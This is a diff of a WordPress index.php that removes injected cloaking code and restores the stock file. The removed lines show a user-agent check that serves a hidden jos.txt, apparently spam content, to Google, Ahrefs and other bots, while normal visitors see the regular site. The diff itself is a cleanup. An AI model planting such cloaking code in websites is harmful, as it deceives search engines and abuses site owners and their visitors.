@@ -1,32 +1,17 @@
 <?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
 
-function is_bot() {
-    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
-        return false;
-    }
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
 
-    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
-    $bots = ['bot', 'ahrefs', 'google'];
-
-    foreach ($bots as $bot) {
-        if (strpos($user_agent, $bot) !== false) {
-            return true;
-        }
-    }
-
-    return false;
-}
-
-if (is_bot()) {
-    $file = __DIR__ . '/jos.txt';
-    if (file_exists($file)) {
-        echo file_get_contents($file);
-    } else {
-        echo "Bot detected, but jos.txt not found.";
-    }
-    exit;
-}
-
-// WordPress bootstrap
-define('WP_USE_THEMES', true);
+/** Loads the WordPress Environment and Template */
 require __DIR__ . '/wp-blog-header.php';
